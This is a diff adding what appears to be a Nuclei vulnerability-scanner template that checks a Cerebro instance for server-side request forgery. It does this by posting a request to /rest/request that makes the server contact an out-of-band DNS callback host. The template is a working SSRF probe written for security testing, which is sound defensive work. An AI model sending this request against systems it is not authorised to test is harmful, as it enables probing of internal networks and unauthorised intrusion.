@@ -1,0 +1,28 @@
+id: cerebro-request-ssrf
+info:
+  name: Cerebro request SSRF
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,dnslog
+http:
+  - raw:
+      - |
+        POST /rest/request HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"method":"GET","data":"","path":"robots.txt","host":"https://{{interactsh-url}}"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "robots.txt"
+        negative: true
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
